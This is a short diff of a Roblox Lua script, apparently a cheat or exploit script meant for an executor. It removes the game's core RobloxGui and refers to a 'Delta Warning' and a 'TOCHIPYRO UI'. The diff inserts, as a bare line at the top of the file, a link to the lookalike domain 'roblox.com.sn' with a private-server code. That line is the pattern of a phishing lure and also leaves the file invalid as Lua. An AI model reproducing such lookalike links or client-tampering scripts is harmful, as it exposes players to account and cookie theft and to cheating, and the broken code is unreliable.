@@ -1,8 +1,11 @@
+https://www.roblox.com.sn/games/8737602449/PLS-DONATE?privateServerLinkCode=54571955658397847151043361017421
+
 local CoreGui = game:GetService("CoreGui")
 local gui = CoreGui:FindFirstChild("RobloxGui")
 if gui then
     gui:Destroy()
 end
+
 
 -- 🟢 Combined Script (Delta Warning + TOCHIPYRO UI)
 local Players = game:GetService("Players")
